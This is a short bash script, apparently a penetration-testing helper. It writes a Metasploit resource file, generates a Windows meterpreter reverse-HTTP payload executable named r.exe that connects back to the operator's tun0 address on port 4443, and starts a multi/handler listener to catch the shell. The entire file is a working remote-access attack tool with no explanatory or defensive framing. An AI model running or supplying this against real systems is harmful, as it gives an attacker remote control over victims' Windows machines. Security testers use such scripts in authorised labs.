#!/bin/bash

# Generate a metrepreter reverse shell payload, and start the listener

RCFILE=host.rc
LHOST=tun0
LPORT=4443
PAYLOAD_EXE=r.exe

cat <<EOF > $RCFILE
use windows/meterpreter_reverse_http
set LHOST $LHOST
set LPORT $LPORT
generate -f exe -o $PAYLOAD_EXE
use multi/handler
set payload windows/meterpreter_reverse_http
set LHOST $LHOST
set LPORT $LPORT
run -j
EOF

msfconsole -q -r $RCFILE
